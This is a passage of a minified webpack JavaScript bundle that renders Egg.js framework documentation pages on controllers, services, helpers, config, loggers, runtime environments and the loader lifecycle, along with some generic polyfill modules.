",r.a.createElement(l["Link"],{to:"./service"},"service"),"(./ service.md) of application."),r.a.createElement("li",null,r.a.createElement("code",null,"logger")," - the encapsulated logger object for the current controller.")),r.a.createElement("p",null,"In the Controller file, there are two ways to use the Controller base class:"),r.a.createElement(o["a"],{code:"// app/controller/user.js\n\n// get from egg (recommend)\nconst Controller = require('egg').Controller;\nclass UserController extends Controller {\n  // implement\n}\nmodule.exports = UserController;\n\n// get from app instance\nmodule.exports = (app) => {\n  return class UserController extends app.Controller {\n    // implement\n  };\n};",lang:"js"}),r.a.createElement("h2",{id:"service"},r.a.createElement(l["AnchorLink"],{to:"#service","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Service"),r.a.createElement("p",null,"Egg provides a Service base class and recommends that all ",r.a.createElement(l["Link"],{to:"./service"},"Service")," inherit from the base class."),r.a.createElement("p",null,"The properties of the Service base class are the same as those of the ",r.a.createElement(l["AnchorLink"],{to:"#controller"},"Controller")," base class, the access method is similar:"),r.a.createElement(o["a"],{code:"// app/service/user.js\n\n// get from egg (recommend)\nconst Service = require('egg').Service;\nclass UserService extends Service {\n  // implement\n}\nmodule.exports = UserService;\n\n// get from app instance\nmodule.exports = (app) => {\n  return class UserService extends app.Service {\n    // implement\n  };\n};",lang:"js"}),r.a.createElement("h2",{id:"helper"},r.a.createElement(l["AnchorLink"],{to:"#helper","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Helper"),r.a.createElement("p",null,"Helper is used to provide some useful utility functions. Its role is that we can put some commonly used functions into helper.js, so we can use JavaScript to write complex logic, avoid the logic being scattered everywhere, and can be more convenient to write test cases."),r.a.createElement("p",null,"The Helper itself is a class that has the same properties as the ",r.a.createElement(l["AnchorLink"],{to:"#controller"},"Controller")," base class, and it will be instantiated at each request so that all functions on the Helper can also get context of the current request."),r.a.createElement("h3",{id:"how-to-get-3"},r.a.createElement(l["AnchorLink"],{to:"#how-to-get-3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to Get"),r.a.createElement("p",null,"We can get the Helper(",r.a.createElement("code",null,"ctx.helper"),") instance of the current request on the Context instance."),r.a.createElement(o["a"],{code:"// app/controller/user.js\nclass UserController extends Controller {\n  async fetch() {\n    const { app, ctx } = this;\n    const id = ctx.query.id;\n    const user = app.cache.get(id);\n    ctx.body = ctx.helper.formatUser(user);\n  }\n}",lang:"js"}),r.a.createElement("p",null,"In addition, Helper instances can also be accessed in template, for example, we can get ",r.a.createElement("code",null,"shtml")," method provided by ",r.a.createElement(l["Link"],{to:"../core/security"},"security")," plugin in template."),r.a.createElement(o["a"],{code:"// app/view/home.nj\n{{ helper.shtml(value) }}",lang:"unknown"}),r.a.createElement("h3",{id:"custom-helper-method"},r.a.createElement(l["AnchorLink"],{to:"#custom-helper-method","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Custom helper method"),r.a.createElement("p",null,"In application development, we may often customize some helper methods, such as ",r.a.createElement("code",null,"formatUser")," in the above example, we can customize helper method with a way of ",r.a.createElement(l["AnchorLink"],{to:"./extend#helper"},"framework extension"),"."),r.a.createElement(o["a"],{code:"// app/extend/helper.js\nmodule.exports = {\n  formatUser(user) {\n    return only(user, ['name', 'phone']);\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"config"},r.a.createElement(l["AnchorLink"],{to:"#config","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Config"),r.a.createElement("p",null,"We recommend application development to follow the principle of configuration and code separation, put hard-coded business in configuration file, and the configuration file supports different runtime environments using different configurations, it is very convenient to use it. the framework, plugin and application-level configurations are available via the Config object. For configuration of Egg, read ",r.a.createElement(l["Link"],{to:"./config"},"Configuration")," in detail."),r.a.createElement("h3",{id:"how-to-get-4"},r.a.createElement(l["AnchorLink"],{to:"#how-to-get-4","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to Get"),r.a.createElement("p",null,"We can get the config object from the Application instance via ",r.a.createElement("code",null,"app.config"),", or get the config object via",r.a.createElement("code",null," this.config")," on the instance of Controller, Service or Helper."),r.a.createElement("h2",{id:"logger"},r.a.createElement(l["AnchorLink"],{to:"#logger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Logger"),r.a.createElement("p",null,"Egg builds in powerful ",r.a.createElement(l["Link"],{to:"../core/logger"},"logger"),", it is very convenient to print a variety of levels of logs to the corresponding log file, each logger object provides 4 level methods:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"logger.debug()")),r.a.createElement("li",null,r.a.createElement("code",null,"logger.info()")),r.a.createElement("li",null,r.a.createElement("code",null,"logger.warn()")),r.a.createElement("li",null,r.a.createElement("code",null,"logger.error()"))),r.a.createElement("p",null,"Egg provides a number of Logger object, we simply introduce how to get each Logger and its use scenario."),r.a.createElement("h3",{id:"app-logger"},r.a.createElement(l["AnchorLink"],{to:"#app-logger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"App Logger"),r.a.createElement("p",null,"We can get it via ",r.a.createElement("code",null,"app.logger"),". If we want to do some application-level logging, such as logging some data in the startup phase, logging some business informations that are unrelated to request, those can be done by App Logger."),r.a.createElement("h3",{id:"app-corelogger"},r.a.createElement(l["AnchorLink"],{to:"#app-corelogger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"App CoreLogger"),r.a.createElement("p",null,"We can get it via ",r.a.createElement("code",null,"app.coreLogger"),", and we should not print logs via CoreLogger when developing applications. the framework and plugins need to print application-level logs to make it easier to distinguish from logs printed by applications and logs printed by frameworks, the logs printed by the CoreLogger will be placed in a different file than the Logger."),r.a.createElement("h3",{id:"context-logger"},r.a.createElement(l["AnchorLink"],{to:"#context-logger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Context Logger"),r.a.createElement("p",null,"We can get it via ",r.a.createElement("code",null,"ctx.logger")," from Context instance, we can see from access method, Context Logger must be related to the request, it will take current request related information (such as ",r.a.createElement("code",null,"[$userId/$ip/$traceId/$","{","cost","}","ms $method $url]"),") in the front of logs, with this information, we can quickly locate requests from logs and concatenate all logs in one request."),r.a.createElement("h3",{id:"context-corelogger"},r.a.createElement(l["AnchorLink"],{to:"#context-corelogger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Context CoreLogger"),r.a.createElement("p",null,"We can get it via ",r.a.createElement("code",null,"ctx.coreLogger"),", the difference between the Context Logger is that only plugins and framework will log via it."),r.a.createElement("h3",{id:"controller-logger--service-logger"},r.a.createElement(l["AnchorLink"],{to:"#controller-logger--service-logger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Controller Logger & Service Logger"),r.a.createElement("p",null,"We can get them via ",r.a.createElement("code",null,"this.logger")," in Controller and Service instance, they are essentially a Context Logger, but additional file path will be added to logs, easy to locate the log print location."),r.a.createElement("h2",{id:"subscription"},r.a.createElement(l["AnchorLink"],{to:"#subscription","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Subscription"),r.a.createElement("p",null,"Subscription is a common model for subscribing, for example, the consumer in message broker or schedule, so we provide the Subscription base class to normalize this model."),r.a.createElement("p",null,"The base class of Subscription can be exported in the following way."),r.a.createElement(o["a"],{code:"const Subscription = require('egg').Subscription;\n\nclass Schedule extends Subscription {\n  // This method should be implemented\n  // subscribe can be async function or generator function\n  async subscribe() {}\n}",lang:"js"}),r.a.createElement("p",null,"We recommend plugin developers to implement based on this model, For example, ",r.a.createElement(l["Link"],{to:"./schedule"},"Schedule"),".")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},ZJCz:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=n("3dEy"),c=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"An web application itself should be stateless and has the ability to set its own according to the runtime environment."),r.a.createElement("h2",{id:"configure-runtime-environment"},r.a.createElement(l["AnchorLink"],{to:"#configure-runtime-environment","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Configure Runtime Environment"),r.a.createElement("p",null,"Egg has two ways to configure runtime environment:"),r.a.createElement("ol",null,r.a.createElement("li",null,"Use ",r.a.createElement("code",null,"config/env")," file, usually we use the build tools to generate this file, the content of this file is just an env value, such as ",r.a.createElement("code",null,"prod"),".")),r.a.createElement(o["a"],{code:"// config/env\nprod",lang:"unknown"}),r.a.createElement("ol",{start:2},r.a.createElement("li",null,"Defining the runtime environment via ",r.a.createElement("code",null,"EGG_SERVER_ENV")," when you start the application is more convenient, for example, use the code below to start the application in the production environment.")),r.a.createElement(o["a"],{code:"EGG_SERVER_ENV=prod npm start",lang:"shell"}),r.a.createElement("h2",{id:"access-to-the-runtime-environment-in-application"},r.a.createElement(l["AnchorLink"],{to:"#access-to-the-runtime-environment-in-application","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Access to the Runtime Environment in Application"),r.a.createElement("p",null,"Egg provides a variable ",r.a.createElement("code",null,"app.config.env")," to represent the current runtime environment of application."),r.a.createElement("h2",{id:"configurations-of-runtime-environment"},r.a.createElement(l["AnchorLink"],{to:"#configurations-of-runtime-environment","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Configurations of Runtime Environment"),r.a.createElement("p",null,"Different running environment corresponds to different configurations, read ",r.a.createElement(l["Link"],{to:"./config"},"Configuration of Config")," in detail."),r.a.createElement("h2",{id:"difference-from-node_env"},r.a.createElement(l["AnchorLink"],{to:"#difference-from-node_env","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Difference from ",r.a.createElement("code",null,"NODE_ENV")),r.a.createElement("p",null,"Lots of Node.js applications use ",r.a.createElement("code",null,"NODE_ENV")," to distinguish the runtime environment, but ",r.a.createElement("code",null,"EGG_SERVER_ENV")," distinguishes the environments much more specific. Generally speaking, there are local environment, test environment, production environment during the application development. In addition to the local development environment and the test environment, other environments are collectively referred to as the ",r.a.createElement("strong",null,"Server Environment")," and their ",r.a.createElement("code",null,"NODE_ENV")," should be set to ",r.a.createElement("code",null,"production"),". What's more, npm will use this variable and will not install the devDependencies when you deploy applications, so ",r.a.createElement("code",null,"production")," should also be applied."),r.a.createElement("p",null,"Default mapping of ",r.a.createElement("code",null,"EGG_SERVER_ENV")," and ",r.a.createElement("code",null,"NODE_ENV")," (will generate ",r.a.createElement("code",null,"EGG_SERVER_ENV")," from ",r.a.createElement("code",null,"NODE_ENV")," setting if ",r.a.createElement("code",null,"EGG_SERVER_ENV")," is not specified)"),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"NODE_ENV"),r.a.createElement("th",null,"EGG_SERVER_ENV"),r.a.createElement("th",null,"remarks"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null),r.a.createElement("td",null,"local"),r.a.createElement("td",null,"local development environment")),r.a.createElement("tr",null,r.a.createElement("td",null,"test"),r.a.createElement("td",null,"unittest"),r.a.createElement("td",null,"unit test environment")),r.a.createElement("tr",null,r.a.createElement("td",null,"production"),r.a.createElement("td",null,"prod"),r.a.createElement("td",null,"production environment")))),r.a.createElement("p",null,"For example, ",r.a.createElement("code",null,"EGG_SERVER_ENV")," will be set to prod when ",r.a.createElement("code",null,"NODE_ENV")," is set as ",r.a.createElement("code",null,"production")," and ",r.a.createElement("code",null,"EGG_SERVER_ENV")," is not specified."),r.a.createElement("h2",{id:"environment-customization"},r.a.createElement(l["AnchorLink"],{to:"#environment-customization","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Environment Customization"),r.a.createElement("p",null,"In normal development process, it's not limit to these environments mentioned above. So you can customize environment for your development process."),r.a.createElement("p",null,"For example, if you want to add SIT (System integration testing) to development process, you can set ",r.a.createElement("code",null,"EGG_SERVER_ENV")," to ",r.a.createElement("code",null,"sit")," (also recommend to set ",r.a.createElement("code",null,"NODE_ENV = production"),"), the framework will load ",r.a.createElement("code",null,"config/config.sit.js")," when launching, and the runtime environment ",r.a.createElement("code",null,"app.config.env")," will be ",r.a.createElement("code",null,"sit"),"."),r.a.createElement("h2",{id:"difference-from-koa"},r.a.createElement(l["AnchorLink"],{to:"#difference-from-koa","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Difference from Koa"),r.a.createElement("p",null,"We are using ",r.a.createElement("code",null,"app.env")," to distinguish the environments in Koa, and the default value for ",r.a.createElement("code",null,"app.env")," is ",r.a.createElement("code",null,"process.env.NODE_ENV"),". But in Egg (and frameworks base on Egg), we put all the configurations in ",r.a.createElement("code",null,"app.config"),", so we should use ",r.a.createElement("code",null,"app.config.env")," to distinguish the environments, ",r.a.createElement("code",null,"app.env")," is no longer used.")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(c,{demos:n})}},ZKbF:function(e,t,n){var a=n("V3tB"),r=n("TVTq"),l=n("1+Tz"),o=n("oyD1");e.exports=a("Reflect","ownKeys")||function(e){var t=r.f(o(e)),n=l.f;return n?t.concat(n(e)):t}},ZZVW:function(e,t,n){"use strict";var a=n("YeTV"),r={childContextTypes:!0,contextType:!0,contextTypes:!0,defaultProps:!0,displayName:!0,getDefaultProps:!0,getDerivedStateFromError:!0,getDerivedStateFromProps:!0,mixins:!0,propTypes:!0,type:!0},l={name:!0,length:!0,prototype:!0,caller:!0,callee:!0,arguments:!0,arity:!0},o={$$typeof:!0,render:!0,defaultProps:!0,displayName:!0,propTypes:!0},i={$$typeof:!0,compare:!0,defaultProps:!0,displayName:!0,propTypes:!0,type:!0},c={};function s(e){return a.isMemo(e)?i:c[e["$$typeof"]]||r}c[a.ForwardRef]=o,c[a.Memo]=i;var u=Object.defineProperty,d=Object.getOwnPropertyNames,m=Object.getOwnPropertySymbols,p=Object.getOwnPropertyDescriptor,h=Object.getPrototypeOf,g=Object.prototype;function f(e,t,n){if("string"!==typeof t){if(g){var a=h(t);a&&a!==g&&f(e,a,n)}var r=d(t);m&&(r=r.concat(m(t)));for(var o=s(e),i=s(t),c=0;c<r.length;++c){var E=r[c];if(!l[E]&&(!n||!n[E])&&(!i||!i[E])&&(!o||!o[E])){var b=p(t,E);try{u(e,E,b)}catch(v){}}}}return e}e.exports=f},ZbH0:function(e,t,n){"use strict";n.d(t,"c",(function(){return o})),n.d(t,"b",(function(){return d}));var a={},r=[],l=function(e){r.push(e)};function o(e,t){}function i(e,t){}function c(){a={}}function s(e,t,n){t||a[n]||(e(!1,n),a[n]=!0)}function u(e,t){s(o,e,t)}function d(e,t){s(i,e,t)}u.preMessage=l,u.resetWarned=c,u.noteOnce=d,t["a"]=u},ZsXs:function(e,t,n){"use strict";var a=n("0mt+"),r=n("SCbZ"),l=n("0RY8"),o="Invalid number representation",i="Invalid radix",c=/^[\da-z]+$/;a({target:"Number",stat:!0},{fromString:function(e,t){var n,a,s=1;if("string"!=typeof e)throw TypeError(o);if(!e.length)throw SyntaxError(o);if("-"==e.charAt(0)&&(s=-1,e=e.slice(1),!e.length))throw SyntaxError(o);if(n=void 0===t?10:r(t),n<2||n>36)throw RangeError(i);if(!c.test(e)||(a=l(e,n)).toString(n)!==e)throw SyntaxError(o);return s*a}})},a7jj:function(e,t){e.exports=function(e){return"object"===typeof e?null!==e:"function"===typeof e}},a9nJ:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=n("3dEy"),c=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"The most importance of Egg which enhanced Koa is that it is based on a certain agreement, code will be placed in different directories according to the functional differences, it significantly reduces development costs. Loader supports this set of conventions and abstracts that many low-level APIs could be extended."),r.a.createElement("h2",{id:"application-framework-and-plugin"},r.a.createElement(l["AnchorLink"],{to:"#application-framework-and-plugin","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Application, Framework and Plugin"),r.a.createElement("p",null,"Egg is a low-level framework, applications could use it directly, but Egg only has a few default plugins, we need to configure plugins to extend features in application, such as MySQL."),r.a.createElement(o["a"],{code:'// application configuration\n// package.json\n{\n  "dependencies": {\n    "egg": "^2.0.0",\n    "egg-mysql": "^3.0.0"\n  }\n}\n\n// config/plugin.js\nmodule.exports = {\n  mysql: {\n    enable: true,\n    package: \'egg-mysql\',\n  },\n}',lang:"js"}),r.a.createElement("p",null,"With the increasing number of applications, we find most of them have similar configurations, so we could extend a new framework based on Egg, which makes application configurations simpler."),r.a.createElement(o["a"],{code:'// framework configuration\n// package.json\n{\n  "name": "framework1",\n  "version": "1.0.0",\n  "dependencies": {\n    "egg-mysql": "^3.0.0",\n    "egg-view-nunjucks": "^2.0.0"\n  }\n}\n\n// config/plugin.js\nmodule.exports = {\n  mysql: {\n    enable: false,\n    package: \'egg-mysql\',\n  },\n  view: {\n    enable: false,\n    package: \'egg-view-nunjucks\',\n  }\n}\n\n// application configuration\n// package.json\n{\n  "dependencies": {\n    "framework1": "^1.0.0",\n  }\n}\n\n// config/plugin.js\nmodule.exports = {\n  // enable plugins\n  mysql: true,\n  view: true,\n}',lang:"js"}),r.a.createElement("p",null,"From the scene above we can see the relationship of application, plugin and framework."),r.a.createElement("ul",null,r.a.createElement("li",null,"We implement business logics in application, and specify a framework to run, so we could configure plugin to meet a special scene feature (such as MySQL)."),r.a.createElement("li",null,"Plugin only performs specific function, when two separate functions are interdependent, they still need to be separated into two plugins, and requires configuration."),r.a.createElement("li",null,"Framework is a launcher (default is Egg), which is indispensable to run. Framework is also a wrapper, it aggregates plugins to provide functions unitedly, and it can also configure plugins."),r.a.createElement("li",null,"We can extend a new framework based on framework, which means that ",r.a.createElement("strong",null,"framework can be inherited infinitely"),", like class inheritance.")),r.a.createElement(o["a"],{code:"+-----------------------------------+--------+\n|      app1, app2, app3, app4       |        |\n+-----+--------------+--------------+        |\n|     |              |  framework3  |        |\n+     |  framework1  +--------------+ plugin |\n|     |              |  framework2  |        |\n+     +--------------+--------------+        |\n|                   Egg             |        |\n+-----------------------------------+--------|\n|                   Koa                      |\n+-----------------------------------+--------+",lang:"unknown"}),r.a.createElement("h2",{id:"loadunit"},r.a.createElement(l["AnchorLink"],{to:"#loadunit","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"LoadUnit"),r.a.createElement("p",null,"Egg regards application, framework and plugin as loadUnit, because they are similar in code structure, here is the directory structure:"),r.a.createElement(o["a"],{code:"loadUnit\n\u251c\u2500\u2500 package.json\n\u251c\u2500\u2500 app.js\n\u251c\u2500\u2500 agent.js\n\u251c\u2500\u2500 app\n\u2502   \u251c\u2500\u2500 extend\n\u2502   |   \u251c\u2500\u2500 helper.js\n\u2502   |   \u251c\u2500\u2500 request.js\n\u2502   |   \u251c\u2500\u2500 response.js\n\u2502   |   \u251c\u2500\u2500 context.js\n\u2502   |   \u251c\u2500\u2500 application.js\n\u2502   |   \u2514\u2500\u2500 agent.js\n\u2502   \u251c\u2500\u2500 service\n\u2502   \u251c\u2500\u2500 middleware\n\u2502   \u2514\u2500\u2500 router.js\n\u2514\u2500\u2500 config\n    \u251c\u2500\u2500 config.default.js\n    \u251c\u2500\u2500 config.prod.js\n    \u251c\u2500\u2500 config.test.js\n    \u251c\u2500\u2500 config.local.js\n    \u2514\u2500\u2500 config.unittest.js",lang:"unknown"}),r.a.createElement("p",null,"However, there are still some differences:"),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"File"),r.a.createElement("th",null,"Application"),r.a.createElement("th",null,"Framework"),r.a.createElement("th",null,"Plugin"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"app/router.js"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null),r.a.createElement("td",null)),r.a.createElement("tr",null,r.a.createElement("td",null,"app/controller"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null),r.a.createElement("td",null)),r.a.createElement("tr",null,r.a.createElement("td",null,"app/middleware"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/service"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/extend"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")),r.a.createElement("tr",null,r.a.createElement("td",null,"app.js"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")),r.a.createElement("tr",null,r.a.createElement("td",null,"agent.js"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")),r.a.createElement("tr",null,r.a.createElement("td",null,"config/config.","{","env","}",".js"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")),r.a.createElement("tr",null,r.a.createElement("td",null,"config/plugin.js"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null)),r.a.createElement("tr",null,r.a.createElement("td",null,"package.json"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")))),r.a.createElement("p",null,"During the loading process, Egg will traverse all loadUnits to load the files above(application, framework and plugin are different), the loading process has priority."),r.a.createElement("ul",null,r.a.createElement("li",null,"Load according to ",r.a.createElement("code",null,"Plugin => Framework => Application"),"."),r.a.createElement("li",null,"The order of loading plugin depends on the dependencies, dependent plugins will be loaded first, independent plugins are loaded by the object key configuration order, see ",r.a.createElement(l["Link"],{to:"./plugin"},"Plugin")," for details."),r.a.createElement("li",null,"Frameworks are loaded by the order of inheritance, the lower the more priority.")),r.a.createElement("p",null,"For example, an application is configured with the following dependencies:"),r.a.createElement(o["a"],{code:"app\n| \u251c\u2500\u2500 plugin2 (depends plugin3)\n| \u2514\u2500\u2500 plugin3\n\u2514\u2500\u2500 framework1\n    | \u2514\u2500\u2500 plugin1\n    \u2514\u2500\u2500 egg",lang:"unknown"}),r.a.createElement("p",null,"The final loading order is:"),r.a.createElement(o["a"],{code:"=> plugin1\n=> plugin3\n=> plugin2\n=> egg\n=> framework1\n=> app",lang:"unknown"}),r.a.createElement("p",null,"The plugin1 is framework1's dependent plugin, the object key order of plugin1 after configuration merger is prior to plugin2/plugin3. Because of the dependencies between plugin2 and plugin3, the order is swapped. The framework1 inherits the Egg, so the order is after the egg. The application is the last to be loaded."),r.a.createElement("p",null,"See ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core/blob/65ea778a4f2156a9cebd3951dac12c4f9455e636/lib/loader/egg_loader.js#L233"},"Loader.getLoadUnits")," method for details."),r.a.createElement("h3",{id:"file-order"},r.a.createElement(l["AnchorLink"],{to:"#file-order","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"File Order"),r.a.createElement("p",null,"The files that will be loaded by default are listed above. Egg will load files by the following order, each file or directory will be loaded according to loadUnit order (application, framework and plugin are different):"),r.a.createElement("ul",null,r.a.createElement("li",null,"Loading ",r.a.createElement(l["Link"],{to:"./plugin"},"plugin"),", find application and framework, loading ",r.a.createElement("code",null,"config/plugin.js")),r.a.createElement("li",null,"Loading ",r.a.createElement(l["Link"],{to:"../basics/config"},"config"),", traverse loadUnit to load ",r.a.createElement("code",null,"config/config.","{","env","}",".js")),r.a.createElement("li",null,"Loading ",r.a.createElement(l["Link"],{to:"../basics/extend"},"extend"),", traverse loadUnit to load ",r.a.createElement("code",null,"app/extend/xx.js")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"../basics/app-start"},"Application startup configuration"),", traverse loadUnit to load ",r.a.createElement("code",null,"app.js")," and ",r.a.createElement("code",null,"agent.js")),r.a.createElement("li",null,"Loading ",r.a.createElement(l["Link"],{to:"../basics/service"},"service"),", traverse loadUnit to load ",r.a.createElement("code",null,"app/service")," directory"),r.a.createElement("li",null,"Loading ",r.a.createElement(l["Link"],{to:"../basics/middleware"},"middleware"),", traverse loadUnit to load ",r.a.createElement("code",null,"app/middleware")," directory"),r.a.createElement("li",null,"Loading ",r.a.createElement(l["Link"],{to:"../basics/controller"},"controller"),", loading application's ",r.a.createElement("code",null,"app/controller")," directory"),r.a.createElement("li",null,"Loading ",r.a.createElement(l["Link"],{to:"../basics/router"},"router"),", loading application's ",r.a.createElement("code",null,"app/router.js"))),r.a.createElement("p",null,"Note:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Same name will be override in loading, for example, if we want to override ",r.a.createElement("code",null,"ctx.ip")," we could define ip in application's ",r.a.createElement("code",null,"app/extend/context.js")," directly."),r.a.createElement("li",null,"See ",r.a.createElement(l["Link"],{to:"./framework"},"framework development")," for detail application launch order.")),r.a.createElement("h3",{id:"life-cycles"},r.a.createElement(l["AnchorLink"],{to:"#life-cycles","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Life Cycles"),r.a.createElement("p",null,"The framework has provided you several functions to handle during the whole life cycle:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"configWillLoad"),": All the config files are ready to load, so this is the LAST chance to modify them."),r.a.createElement("li",null,r.a.createElement("code",null,"configDidLoad"),": When all the config files have been loaded."),r.a.createElement("li",null,r.a.createElement("code",null,"didLoad"),": When all the files have been loaded."),r.a.createElement("li",null,r.a.createElement("code",null,"willReady"),": When all the plugins are ready."),r.a.createElement("li",null,r.a.createElement("code",null,"didReady"),": When all the workers are ready."),r.a.createElement("li",null,r.a.createElement("code",null,"serverDidReady"),": When the server is ready."),r.a.createElement("li",null,r.a.createElement("code",null,"beforeClose"),": Before the application is closed.")),r.a.createElement("p",null,"Here're the definations:"),r.a.createElement(o["a"],{code:"// app.js or agent.js\nclass AppBootHook {\n  constructor(app) {\n    this.app = app;\n  }\n\n  configWillLoad() {\n    // Ready to call configDidLoad,\n    // Config, plugin files are referred,\n    // this is the last chance to modify the config.\n  }\n\n  configDidLoad() {\n    // Config, plugin files have been loaded.\n  }\n\n  async didLoad() {\n    // All files have loaded, start plugin here.\n  }\n\n  async willReady() {\n    // All plugins have started, can do some thing before app ready\n  }\n\n  async didReady() {\n    // Worker is ready, can do some things\n    // don't need to block the app boot.\n  }\n\n  async serverDidReady() {\n    // Server is listening.\n  }\n\n  async beforeClose() {\n    // Do some thing before app close.\n  }\n}\n\nmodule.exports = AppBootHook;",lang:"js"}),r.a.createElement("p",null,"The framework will automatically load and initialize this class after developers have defined ",r.a.createElement("code",null,"app.js")," and ",r.a.createElement("code",null,"agenet.js")," in the form of class, and it will call the corresponding methods during each of the life cycles."),r.a.createElement("p",null,"Here's the image of starting process:"),r.a.createElement("p",null,r.a.createElement("img",{src:"https://user-images.githubusercontent.com/40081831/50559449-2d3cdc80-0d32-11e9-96f2-42b3cc56d5d3.png",alt:""})),r.a.createElement("p",null,r.a.createElement("strong",null,"Notice: We have an expiring time limitation when using ",r.a.createElement("code",null,"beforeClose")," to close the processing of the framework. If a worker has accepted the signal of exit but doesn't exit within the limit period, it will be FORCELY closed.")),r.a.createElement("p",null,"If you need to modify the expiring time, please see ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-cluster"},"this document"),"."),r.a.createElement("p",null,"Deprecated methods:"),r.a.createElement("h2",{id:"beforestart"},r.a.createElement(l["AnchorLink"],{to:"#beforestart","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"beforeStart")),r.a.createElement("p",null,r.a.createElement("code",null,"beforeStart")," is called during the loading process, all of its methods are running in parallel. So we usually execute some asynchronized methods (e.g: Check the state of connection, in ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mysql/blob/master/lib/mysql.js"},r.a.createElement("code",null,"egg-mysql"))," we use this method to check the connection state with mysql). When all the tasks in ",r.a.createElement("code",null,"beforeStart")," finished, the state will be ",r.a.createElement("code",null,"ready"),". It's NOT recommended to excute a function that consumes too much time there, which will cause the expiration of application's start.plugin developers should use ",r.a.createElement("code",null,"didLoad")," instead, for application developers, ",r.a.createElement("code",null,"willReady")," is the replacer."),r.a.createElement("h2",{id:"ready"},r.a.createElement(l["AnchorLink"],{to:"#ready","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon 